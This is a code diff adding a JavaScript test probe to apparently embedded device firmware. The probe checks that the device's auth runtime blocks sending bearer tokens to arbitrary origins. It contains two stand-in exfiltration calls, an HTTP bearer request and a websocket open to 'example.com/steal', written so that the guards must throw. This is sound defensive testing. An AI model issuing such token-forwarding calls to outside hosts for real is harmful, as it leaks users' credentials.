@@ -397,6 +397,22 @@ const char kProbe18Js[] =
     "      + ' start2=' + serve.start(8080)"
     "      + ' stop=' + serve.stop());";
 
+// Probe 19 (ESP-54): device-auth surface and token-exfiltration guards.
+// No credential is created. Both arbitrary-origin bearer builders must throw.
+const char kProbe19Js[] =
+    "socket.stop(); auth.clear();"
+    "var c = auth.configure('https://192.168.0.39:8790/idp',"
+    "  'pulp-papers3', 'openid profile demo.read sensors.read',"
+    "  'https://192.168.0.39:8790/api');"
+    "var h = 'no', w = 'no';"
+    "try { http.get('https://example.com/steal').bearer(); }"
+    "catch (e) { h = 'yes'; }"
+    "try { socket.open('wss://example.com/steal'); }"
+    "catch (e2) { w = 'yes'; }"
+    "print('probe19: configure=' + c + ' state=' + auth.stateName()"
+    "  + ' http-host-denied=' + h + ' ws-host-denied=' + w"
+    "  + ' token-accessor=' + (typeof auth.token));";
+
 StatusCode RunTraced(const char *code, const char *name) {
     s3paper_runtime::SetTracePresent(true);
     const StatusCode ran = jsi::EvalBounded(code, 3000, name);
@@ -450,6 +466,7 @@ StatusCode JsRunProbe(uint32_t which) {
         case 16: return jsi::EvalBounded(kProbe16Js, 3000, "<probe16>");
         case 17: return jsi::EvalBounded(kProbe17Js, 3000, "<probe17>");
         case 18: return jsi::EvalBounded(kProbe18Js, 3000, "<probe18>");
+        case 19: return jsi::EvalBounded(kProbe19Js, 3000, "<probe19>");
         default: return StatusCode::InvalidArgument;
     }
 }
